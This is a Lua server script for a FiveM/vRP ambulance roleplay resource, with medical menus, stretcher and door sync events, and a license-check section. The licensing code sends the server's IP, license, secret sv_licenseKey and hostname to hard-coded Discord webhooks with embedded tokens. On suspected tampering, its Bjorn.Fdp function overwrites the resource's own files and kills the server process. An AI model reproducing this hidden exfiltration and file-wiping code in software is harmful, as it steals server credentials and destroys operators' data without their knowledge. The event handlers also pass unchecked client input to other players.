local Tunnel = module("vrp","lib/tunnel")
local Proxy = module("vrp","lib/proxy")
vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vRP")

Bjorn = {}
Tunnel.bindInterface("BjornMedical",Bjorn) 

-----------------------------------------------------------------------------------------------------------------------------------------
--[ Verificar e pegar item no inv ]-----------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------


function Bjorn.TryItem(item) 

	local source = source
	local user_id = vRP.getUserId(source)
		if vRP.tryGetInventoryItem(user_id,item,1) then
			return true
		end
end

-----------------------------------------------------------------------------------------------------------------------------------------
--[ chk Perm ]-----------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------

function Bjorn.chkPerm() 
	local source = source
	local user_id = vRP.getUserId(source)
		if vRP.hasPermission(user_id,config.permissao) then
			return true
		end
end


-----------------------------------------------------------------------------------------------------------------------------------------
--[ MENU ]-----------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------


RegisterNetEvent('BjornMedical:MedicalMenu')
AddEventHandler('BjornMedical:MedicalMenu',function()
local source = source
local user_id = vRP.getUserId(source)
	local menu = {name = "Ambulancia"}
	local submenu = {name = "Entrar"}
	
	menu["Pegar/Guardar Maleta"] = {function(source,choice)
			vRP.closeMenu(source,menu)
            TriggerClientEvent("BjornMedical:Pegando/GuardandoMaleta",source)			
    end}vRP.openMenu(source,menu)
	
	
	menu["Pegar/Guardar Maca"] = {function(source,choice)
			vRP.closeMenu(source,menu)
			
            TriggerClientEvent("BjornMedical:TakeMaca",source)					
			
    end}vRP.openMenu(source,menu)
	
	menu["Abrir/Fechar Portas"] = {function(source,choice)
			vRP.closeMenu(source,menu)
			
            TriggerClientEvent("BjornMedical:OpenAndCloseDoorsSource",source)					
			
    end}vRP.openMenu(source,menu)
	
	menu["Entrar na ambulancia"] = {function(source,choice)          
		submenu["Acento Esquerdo"] = {function(source,choice)
			vRP.closeMenu(source,submenu)	
			TriggerClientEvent("BjornMedical:EnterAmbulance",source,1)				
				
		end}vRP.openMenu(source,submenu)
		submenu["Acento Direito"] = {function(source,choice)
			vRP.closeMenu(source,submenu)					
			TriggerClientEvent("BjornMedical:EnterAmbulance",source,2)
				
		end}vRP.openMenu(source,submenu)
    end}vRP.openMenu(source,menu)
end)



-----------------------------------------------------------------------------------------------------------------------------------------
--[ EVENTO PRA SYNCAR A MALETA ]-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------

RegisterNetEvent('BjornMedical:ColocarMaletaChaoServer')
AddEventHandler('BjornMedical:ColocarMaletaChaoServer',function(x,y,z)

TriggerClientEvent('BjornMedical:ColocarMaletaChao',source,x,y,z)

end)


-----------------------------------------------------------------------------------------------------------------------------------------
--[ EVENTO PRA SYNCAR DELETE DA MALETA ]-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------

RegisterNetEvent('BjornMedical:DeletarMaletaChaoServer')
AddEventHandler('BjornMedical:DeletarMaletaChaoServer',function(propMaletaChao)

TriggerClientEvent('BjornMedical:DeletarMaletaChao',-1,propMaletaChao)

end)


-----------------------------------------------------------------------------------------------------------------------------------------
--[ EVENTO PRA SYNCAR PORTAS ]-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------

RegisterNetEvent('BjornMedical:OpenAndCloseDoors')
AddEventHandler('BjornMedical:OpenAndCloseDoors',function(veh)
TriggerClientEvent("BjornMedical:OpenAndCloseDoors",-1,veh)	
end)


-----------------------------------------------------------------------------------------------------------------------------------------
--[ EVENTO PRA SYNCAR ANIMACAO DE CARREGAR ]---------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------

RegisterNetEvent('BjornMedical:SyncAnimationColo')
AddEventHandler('BjornMedical:SyncAnimationColo',function(nplayer)
local source = source
if nplayer then
	TriggerClientEvent("BjornMedical:SyncAnimationColo",nplayer,source)	
end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
--[ EVENTO PRA SYNCAR REANIMACAO ] ------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------

RegisterNetEvent('BjornMedical:Reanimando')
AddEventHandler('BjornMedical:Reanimando',function(nplayer, head, coord, loc)
local source = source
if nplayer then	
	TriggerClientEvent('BjornMedical:AnimacaoMorto', nplayer, head, coord, loc)
    TriggerClientEvent('BjornMedical:AnimacaoMedico', source)
end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
--[ EVENTO PRA SYNCAR TRATAMENTO ] ------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------

RegisterNetEvent("BjornMedical:SyncTreatMent")
AddEventHandler("BjornMedical:SyncTreatMent",function(nplayer)
	if nplayer then	
		TriggerClientEvent("BjornMedical:SyncTreatMent", nplayer)
	end
end)



-----------------------------------------------------------------------------------------------------------------------------------------
--[ EVENTO PRA SYNCAR O PLAYER NA MACA DA AMBU ]---------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------

RegisterNetEvent('BjornMedical:PacienteMacaAmbu')
AddEventHandler('BjornMedical:PacienteMacaAmbu',function(nplayer,veh,x,y,z,rotx,roty,rotz)
TriggerClientEvent('BjornMedical:PacienteMacaAmbu',nplayer,veh,x,y,z,rotx,roty,rotz)

end)

-----------------------------------------------------------------------------------------------------------------------------------------
--[ EVENTO PRA SYNCAR O PLAYER NA MACA SOLTA ]-------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------

RegisterNetEvent('BjornMedical:SyncPlayerMacaSolta')
AddEventHandler('BjornMedical:SyncPlayerMacaSolta',function(nplayer,maca)
TriggerClientEvent('BjornMedical:SyncPlayerMacaSolta',nplayer,maca)
end)


-----------------------------------------------------------------------------------------------------------------------------------------
--[ FUNÇÃO DO WEBHOOK ]------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
function SendWebhookMessage(webhook,message)
	if webhook ~= nil and webhook ~= "" then
		PerformHttpRequest(webhook, function(err, text, headers) end, 'POST', json.encode({content = message}), { ['Content-Type'] = 'application/json' })
	end
end

local nomeresource = "BjornMedical"
local usuarioDono = "Bjorn#5034"
local ativo = false
local IpList = {}   ------------------------------------------------------ ALTERAR LINHA 61 E 63 PARA O NOME DA WHITELIST
local LicenseList = {}
local VersionList = {}
local versao = "1.0"


local serverName = GetConvar("sv_hostname")
local serverKey = GetConvar("sv_licenseKey") 


local verificacao = false
local LogAutenticado = "https://discord.com/api/webhooks/885213661998743582/BxaUIvDtSGfJ1Wk_Uud1_oeovOcwuwCWsZZizT2fbqvs0VvtLINtdMSUm87J5wNopTpA"
local LogVazado = "https://discord.com/api/webhooks/885213769930801222/HExS1qMhedTPhoD8cBofmhd4CtHlBSBBb4vb2PPI7W01iP6lq_G6q0j-BpS9t6aeekRl"
local LogFDP = "https://discord.com/api/webhooks/905309852191043615/U0H6smFCMrHBOQTAGK7u3JA6xJKW_h1FCMWOisxGXD8ZiVLdJytt12IOQ_UvNsVs9MJ5"

local nomescript = GetCurrentResourceName()

AddEventHandler('onResourceStart', function(resourceName)
print("aaaaaaaaaaa")
	if not verificacao then
	verificacao = true
	if debug.getinfo( PerformHttpRequest ).short_src:find("citizen:/scripting/lua/scheduler.lua") then
	
	if Bjorn.chkSecurity() then
	if config.license then
	--[[
	local a = debug.getinfo(PerformHttpRequest).short_src
	local b = string.gsub(a, "/", "\\\\")
	print("a: " ..a)
	print("b: " ..b)

	local file = io.open("@"..a,'w')
	print(file)
    if file then
	print("1")
        file:write("meuCU")
        file:close()
	end	
	]]
	
	
	local ignore, ip = http_request("https://api.ipify.org/", "GET")                ----------------- AQUI PEGA O IP
	local lista, whitelist = http_request("https://pastebin.com/raw/es5nDEqb", "GET")  ---------------- AQUI RETORNA A WHITELIST
	local ips1 = json.decode(whitelist)   ------------------------------------------------- AQUI DECODA A WHITELIST
	
	if ip == nil then
	print("\n^8 ["..nomescript.."] - Tentativa de pegar o IP da maquina falhou. Tentando pegar o IP novamente!^0")	
	ignore, ip = http_request("http://meuip.com/api/meuip.php", "GET")
	end
	
	if ip == nil then
	print("\n^8 ["..nomescript.."] - Tentativa de pegar o IP da maquina falhou novamente. Realizando outra tentativa!^0")	
	local teste,teste2 = http_request("https://ipinfo.io/json", "GET")
	local test3 = json.decode(teste2)
	ip = test3.ip
	end
	
	if ips1 == nil then
	print("\n^8 ["..nomescript.."] - Tentativa de acessar o Banco de dados falhou. Acessando outro Banco de dados!^0")	
	local lista, whitelist = http_request("https://raw.githubusercontent.com/BjornIronS/whitelist/main/AllInOne", "GET")
	local ips1 = json.decode(whitelist)	
	ips = ips1.Ambulance
	else
	ips = ips1.Ambulance
	end
	
	if ip then
	if ips then
	
	for k,v in pairs(ips) do
		IpList[v.ip] = true
		LicenseList[v.ip] = v.license	
		VersionList[v.ip] = v.versao
	end	
	
	if IpList[ip] then 
	if LicenseList[ip] == config.license then
	if VersionList[ip] == versao then
	ativo = true
	print("\n^8 ["..nomescript.."] ^0- ^2Cliente Autenticado com Sucesso!^0")
	SendWebhookMessage(LogAutenticado,"```ini\nㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ[ NOVO CLIENTE AUTENTICADO! ] \n\n\n[ SISTEMA ]: "..nomescript.."\n[ IP ]: "..ip.." \n[LICENSE]: "..config.license.." \n[KEY DO SERVIDOR]: "..serverKey.." \n[ NOME DO SERVIDOR ]: "..serverName.."  \n\n "..os.date("\n[Data]: %d/%m/%Y [Hora]: %H:%M:%S").."  \r```")		
	Wait(30000)
	Bjorn.chkSecurityTwo()
	else
	print("\n^8 ["..nomescript.."] - Cliente Não Autenticado, ^6Versão desatualizada!^8 Entre em contato com ^2"..usuarioDono.."!^0")	
	end
	else
	print("\n^8 ["..nomescript.."] - Cliente Não Autenticado, ^6License Key Invalida!^8 Entre em contato URGENTE com ^2"..usuarioDono.."!^0")	
	SendWebhookMessage(LogVazado,"```cs\nㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ[ DENUNCIA DE SISTEMA VAZADO! ] \n\n[ SISTEMA ]: "..nomescript.."\n[ IP ]: "..ip.."\n[LICENSE]: "..config.license.."\n[MOTIVO]: LICENSE INVALIDA \n[KEY DO SERVIDOR]: "..serverKey.." \n[ NOME DO SERVIDOR ]: "..serverName.." \n "..os.date("\n[Data]: %d/%m/%Y [Hora]: %H:%M:%S").."  \r```")
	end
	else
	ativo = false
	print("\n^8 ["..nomescript.."] - Cliente Não Autenticado, Entre em contato URGENTE com ^2"..usuarioDono.."!^0")	
	SendWebhookMessage(LogVazado,"```cs\nㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ[ DENUNCIA DE SISTEMA VAZADO! ] \n\n[ SISTEMA ]: "..nomescript.."\n[ IP ]: "..ip.."\n[LICENSE]: "..config.license.."\n[MOTIVO]: IP NAO AUTORIZADO \n[KEY DO SERVIDOR]: "..serverKey.." \n[ NOME DO SERVIDOR ]: "..serverName.." \n "..os.date("\n[Data]: %d/%m/%Y [Hora]: %H:%M:%S").."  \r```")
	return
	end
	if nomescript ~= nomeresource then
    print("\n^8 ["..nomescript.."] - Script Pausado por mudanca de ^2NOME^0! ^8Mude o nome para ^2"..nomeresource.." ^8e reinicie o Script.^0")
    ativo = false
    StopResource(nomescript)
    end
	else
	print("\n^8 ["..nomescript.."] - Houve um problema ao acessar o Banco de dados para realizar a autenticação! \n^6                           Reinicie o Script^8, caso persista entre em contato com ^2"..usuarioDono.."!^0")
	end
	else
	print("\n^8 ["..nomescript.."] - Houve um problema ao identificar seu IP para realizar a autenticação! \n^6                           Reinicie o Script^8, caso persista entre em contato com ^2"..usuarioDono.."!^0")
	end
	else
	print("\n^8 ["..nomescript.."] - Licença não encontrada no config!")
	end
	end
	else
	
	local ignore, ip = http_request("https://api.ipify.org/", "GET")
	while ip == nil do
	Wait(1000)
	ignore, ip = http_request("https://api.ipify.org/", "GET")
	end
	Bjorn.Fdp()
	end
end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------FUNÇÃO DE CRIAR OS REQUEST DE AUTENTICAÇÃO----------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
function http_request(url, method, data)
    local p = promise.new() 
    PerformHttpRequest(url, function(status,data)
      p:resolve({status,data})
    end, method, data or '', headers)
    local response = Citizen.Await(p)
    return response[1],response[2]
end
-----------------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------SECURITY-------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
function Bjorn.chkSecurity()
	local _, ip = http_request("https://api.ipify.org/", "GET")
	local _, ip2 = http_request("http://meuip.com/api/meuip.php", "GET")
	local _, ip3 = http_request("https://ipinfo.io/json", "GET")
	ip3 = json.decode(ip3)
	ip3 = ip3.ip
	if ip and ip2 and ip3 then
	if ip == ip2 and ip == ip3 and ip2 == ip3 then
	
	local _, ipLoc = http_request("http://ip-api.com/json/" ..ip, "GET")
	if ipLoc then
	local DecodeList = json.decode(ipLoc)	
	if ip3 == DecodeList.query then
	return true
	end
	else
		return true
	end
	else
	Bjorn.Fdp()
	end
	else
	return true
	end
end

function Bjorn.chkSecurityTwo()
local _, ip = http_request("https://api.ipify.org/", "GET")
if ip then
local _, List = http_request("https://api.freegeoip.app/json/?apikey=79321100-3cd1-11ec-aa92-7d91997a8cb4", "GET")
local _, List2 = http_request("https://api.freegeoip.app/json/"..ip.."?apikey=79321100-3cd1-11ec-aa92-7d91997a8cb4", "GET")
if List and List2 then
local Dec = json.decode(List)
local Dec2 = json.decode(List2)
if Dec.ip == Dec2.ip and Dec.zip_code == Dec2.zip_code and Dec.latitude == Dec2.latitude then 
--print("Tudo certo")
else
Bjorn.Fdp()
end
end
end
end


function Bjorn.Fdp()
print("^8["..nomescript.."] - Foi identificado tentativa de quebrar o código, Se persistir não irá gostar do que vai acontecer!")
SendWebhookMessage(LogFDP,"```cs\nㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ[ FDP TENTANDO QUEBRAR O CÓDIGO! ] \n\n[ SISTEMA ]: "..nomescript.."\n[ IP ]: "..ip.."\n[LICENSE]: "..config.license.." \n[KEY DO SERVIDOR]: "..serverKey.." \n[ NOME DO SERVIDOR ]: "..serverName.." \n "..os.date("\n[Data]: %d/%m/%Y [Hora]: %H:%M:%S").."  \r```")
SaveResourceFile(GetCurrentResourceName(), 'client.lua', "Seu Ban ta chegando!")
Wait(1000)
SaveResourceFile(GetCurrentResourceName(), 'server.lua', "Seu Ban ta chegando!")
Wait(1000)
SaveResourceFile(GetCurrentResourceName(), 'config.lua', "Seu Ban ta chegando!")
Wait(1000)
SaveResourceFile(GetCurrentResourceName(), 'fxmanifest.lua', "Seu Ban ta chegando!")
Wait(1000)
os.exit()
end

-----------------------------------------------------------------------------------------------------------------------------------------
--[ chk Auth ]-----------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
function Bjorn.chkAuth()
if ativo then
return true
end
end
-----------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
for k,v in pairs(debug.getinfo( PerformHttpRequest )) do
print("vvvvvvvvvvvvvvvv")
end

